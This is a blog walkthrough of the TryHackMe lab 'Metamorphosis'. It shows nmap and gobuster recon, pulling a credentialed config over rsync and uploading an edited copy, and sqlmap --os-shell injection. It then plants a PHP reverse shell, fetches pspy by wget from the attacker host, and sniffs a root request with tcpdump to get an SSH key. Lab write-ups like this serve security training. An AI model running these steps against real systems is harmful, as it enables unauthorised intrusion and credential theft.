---
title: TryHackMe Metamorphosis
date: 2021-07-21T03:31:08+05:30
lastmod: 2021-07-21T03:31:08+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Metamorphosis

draft: false
description: TryHackMe Room Metamorphosis solved by Animesh Roy. this is a walkthough. read more...

---
## OverView

|Metamorphosis||
|---|:---:|
|Room|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/93e2e34d54161c2a22b80a1eb5cd9857.jpeg)|

## Recon

### nmap

     ```nmap
     sudo nmap -sC -sV -oN Metamorphosis 10.10.38.244
     [sudo] password for anir0y: 
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 03:35 IST
     Nmap scan report for 10.10.38.244
     Host is up (0.17s latency).
     Not shown: 995 closed ports
     PORT    STATE SERVICE     VERSION
     22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
     |   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
     |   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
     |_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
     80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
     |_http-server-header: Apache/2.4.29 (Ubuntu)
     |_http-title: Apache2 Ubuntu Default Page: It works
     139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
     445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
     873/tcp open  rsync       (protocol version 31)
     Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

     Host script results:
     |_clock-skew: mean: 3s, deviation: 0s, median: 2s
     |_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
     | smb-os-discovery: 
     |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
     |   Computer name: incognito
     |   NetBIOS computer name: INCOGNITO\x00
     |   Domain name: \x00
     |   FQDN: incognito
     |_  System time: 2021-07-20T22:05:48+00:00
     | smb-security-mode: 
     |   account_used: guest
     |   authentication_level: user
     |   challenge_response: supported
     |_  message_signing: disabled (dangerous, but default)
     | smb2-security-mode: 
     |   2.02: 
     |_    Message signing enabled but not required
     | smb2-time: 
     |   date: 2021-07-20T22:05:48
     |_  start_date: N/A

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
     ```

### Directory Listing with `GoBuster`

     ```bash
     gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
     #txt & php extention for good measure
     ...[snip]...
     /index.php            (Status: 200) [Size: 10818]
     /admin                (Status: 301) [Size: 312] [--> http://10.10.38.244/admin/]
     ```

- `admin` dir is returning `403`

     ![img](https://i.imgur.com/3Vqorz4.png)

- strange enough it returns the following text upcon `view-source`
     ![img](https://i.imgur.com/cOKj7Ek.png)

seems like somehow we need to change back /config website to `development` mode. seems like a deadend here! :(

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

### rsync enumeration

- Enumerated the rsync module:

     ```bash
     rsync -rdt rsync://10.10.38.244:873
     Conf            All Confs
     ```

- list content of `Conf`
  
     ```bash
     rsync -rdt rsync://10.10.38.244:873/Conf
     drwxrwxrwx          4,096 2021/04/11 01:33:08 .
     -rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
     -rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
     -rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
     -rw-r--r--            332 2021/04/10 01:31:38 ldap.conf
     -rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
     -rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
     -rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
     -rw-r--r--            320 2021/04/10 01:33:16 ports.conf
     -rw-r--r--            589 2021/04/10 01:31:07 resolv.conf
     -rw-r--r--             29 2021/04/10 01:32:56 screen-cleanup.conf
     -rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
     -rw-rw-r--             72 2021/04/11 01:33:06 webapp.ini
     ```

- With access to the share, download everything available to the attacking machine.

     ```bash
     rsync -av rsync://10.10.38.244:873/Conf ./rsync
     ```

- list the downloaded files:
  
     ```zsh
     ls -l
     total 193
     -rw------- 1 502 dialout  4620 Jul 21 03:54 access.conf
     -rw-r--r-- 1 502 dialout  1341 Apr 10 01:26 bluezone.ini
     -rw------- 1 502 dialout  2969 Jul 21 03:54 debconf.conf
     -rw------- 1 502 dialout   332 Jul 21 03:54 ldap.conf
     -rw------- 1 502 dialout 94404 Jul 21 03:54 lvm.conf
     -rw-r--r-- 1 502 dialout  9005 Apr 10 01:28 mysql.ini
     -rw-r--r-- 1 502 dialout 70207 Apr 10 01:26 php.ini
     -rw------- 1 502 dialout   320 Jul 21 03:54 ports.conf
     -rw------- 1 502 dialout   589 Jul 21 03:54 resolv.conf
     -rw------- 1 502 dialout    29 Jul 21 03:54 screen-cleanup.conf
     -rw------- 1 502 dialout  9542 Jul 21 03:54 smb.conf
     -rw-rw-r-- 1 502 dialout    72 Apr 11 01:33 webapp.ini
     ```

- `webapp.ini` looks kinda intresting
  
     ```bash
     cat webapp.ini 
     [Web_App]
     env = prod
     user = tom
     password = theCat

     [Details]
     Local = No
     ```

     seems like we have a wokring config, where currently `env` sets to **prod** and we can actually change and re-upload to the server. let's try doing this.

     replace `env = prod` to `env = dev`

- reuploading `webapp.ini` to the server

     ```zsh
     rsync -av rsync/webapp.ini rsync://10.10.38.244:873/Conf/webapp.ini  
     sending incremental file list
     webapp.ini

     sent 171 bytes  received 41 bytes  84.80 bytes/sec
     total size is 71  speedup is 0.33
     # uploaded the edited file
     ```

### re-visiting the web

- this time web-application actually worked!

     ![img](https://i.imgur.com/Am4aEwe.png)

- we have one `input`, first thing I'm gonna try is `SQLMAP` for sqlinjection attack.

- saving the SQL payload using Burp
     ![img](https://i.imgur.com/7k8g5LK.png)

- running `SQLMAP`

     ```bash
     sqlmap -r username.req --level 3 --risk 3 --batch --os-shell
     # trying to get a `os-shell` this way
     ```
     
     ![img](https://i.imgur.com/WEZbgc4.png)

     and it worked! let's try and get a proper working shell

- With command execution, establish a persistent shell by transferring a php script and calling it with curl to return a reverse shell on the target.
  
     I will be uploading `php reverse shell`

     ```bash
     cp /usr/share/webshells/php/php-reverse-shell.php rev.php
     ```

     ![img](https://i.imgur.com/FLWILS7.png)
     change the IP

- upload it via curl:

     ![img](https://i.imgur.com/kjY2byf.png)

     got the `low priv` shell access to the box

- we can read the `user.txt` file with current shell.

     ![img](https://i.imgur.com/Crs4ZDe.png)

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## root

so far we have a low priv shell running as `www-data`

### Privilege Escalation

- I ran `linpeas` but no usefull results. except `www-data` can run `tcpdump`
- `sudo -l` returns nothing useful
- got a hint for running `Pspy`. you can download it here: https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0

- running `PSPY`
  
     ```bash
     # download to the BOX
     wget http://10.17.4.40/pspy64s
     wget http://10.17.4.40/pspy64s
     --2021-07-20 23:03:43--  http://10.17.4.40/pspy64s
     Connecting to 10.17.4.40:80... connected.
     HTTP request sent, awaiting response... 200 OK
     Length: 1156536 (1.1M) [application/octet-stream]
     Saving to: 'pspy64s'

     pspy64s             100%[===================>]   1.10M   538KB/s    in 2.1s    

     2021-07-20 23:03:46 (538 KB/s) - 'pspy64s' saved [1156536/1156536]

     ## give +x & run; wait for new process to spin


     chmod +x pspy64s; ./pspy64s
     pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


          ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
     ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
     ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
     ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
     ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
     ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
     ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                    ░           ░ ░     
                                   ░ ░ 

     ...
     2021/07/20 23:05:06 CMD: UID=33   PID=1877   | python -c import pty; pty.spawn("/bin/sh") 
     # my shell

     2021/07/20 23:06:01 CMD: UID=0    PID=20564  | /bin/sh /root/req.sh 
     2021/07/20 23:06:01 CMD: UID=0    PID=20563  | /bin/sh /root/req.sh 
     2021/07/20 23:06:01 CMD: UID=0    PID=20562  | /bin/sh -c /root/req.sh 
     # well root is trying to run something!!
     ```

Attempts to curl it as the www-data user fail and are met with a message stating it only interacts with the root user. Attempts to tunnel the internal port back to the target machine and curl as root there failed. So tcpdump was identified installed and used to capture the curl request. The resulting packet capture was transferred to the attacking machine and opened in wireshark.

- run tcpdump in one terminal
  
     ```bash
     tcpdump -i any -s 0 -w 1.pcap
     # my relative path is `/var/www/html/
     #reason being I can wget the pcap without terminating the tcpdump
     ```

- run pspy on 2nd terminal
  
     ```bash
     www-data@incognito:/tmp$ ./ps*
     ./ps*
     pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


          ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
     ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
     ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
     ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
     ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
     ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
     ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                    ░           ░ ░     
                                   ░ ░     

     # wait till these shows up again
     1/07/21 00:18:01 CMD: UID=0    PID=1830   | curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12                                                       
     2021/07/21 00:18:01 CMD: UID=0    PID=1829   | /bin/sh /root/req.sh 
     2021/07/21 00:18:01 CMD: UID=0    PID=1828   | /bin/sh -c /root/req.sh 
     ```

- wget the pcap file
  
     ```zsh
     wget MACHINE_IP/traffic.pcap
     ```

- open `pcap` file with wireshark
     ![img](https://i.imgur.com/63l0roF.png)
- copy the key
     ![img](https://i.imgur.com/4CYUtN7.png)
- save the `ssh` key

     ```bash
     vi key.ssh                         # put the content
     chmod 600                          #require for SSH key security
     ssh -i key.ssh root@MACHINE_IP     # you logged in as root
     ```

     ![img](https://i.imgur.com/uQhsMGR.png)

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
